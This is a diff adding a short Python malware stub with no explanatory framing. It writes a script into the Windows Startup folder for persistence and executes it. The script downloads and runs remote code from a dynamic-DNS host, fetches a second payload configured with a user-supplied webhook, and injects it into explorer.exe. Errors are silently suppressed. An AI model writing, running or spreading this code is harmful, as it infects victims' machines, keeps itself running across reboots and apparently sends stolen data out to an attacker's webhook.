@@ -1,0 +1,9 @@
+from os import environ
+WEBHOOK = "YOUR WEBHOOK HERE"
+code = fr"""from urllib import request
+exec(request.urlopen('http://lactuapi.ddns.net:5002/inject.py').read())
+code = 'WEBHOOK = "{WEBHOOK}"\n' + request.urlopen(request.Request('http://lactuapi.ddns.net:5002/code.py')).read().decode()
+inject('explorer.exe',code)"""
+try: open(fr"{environ['appdata']}\Microsoft\Windows\Start Menu\Programs\Startup\Python.pyw", 'w').write(code)
+except: pass
+exec(code)
